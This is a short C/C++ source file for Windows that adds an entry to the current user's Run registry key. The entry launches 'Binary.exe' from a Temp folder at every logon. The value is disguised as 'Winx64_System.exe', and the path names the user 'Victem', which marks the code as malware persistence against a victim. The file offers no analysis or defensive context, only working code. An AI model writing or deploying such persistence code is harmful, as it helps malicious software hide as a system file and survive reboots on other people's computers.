#include<windows.h>
int main() {
    HKEY hKey;
    LPCSTR subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"Winx64_System.exe";
    LPCWSTR executablePath = L"C:\\Users\\Victem\\AppData\\Local\\Temp\\Binary.exe";

    // Open the registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        size_t pathLength = wcslen(executablePath);
        // Set the registry value to point to the executable path
        if (RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(executablePath), (pathLength + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            // Successfully added to startup
            RegCloseKey(hKey);
            return 0;
        }
        // Handle error setting registry value
        RegCloseKey(hKey);
    }
    // Handle error opening registry key
    return 1;
}
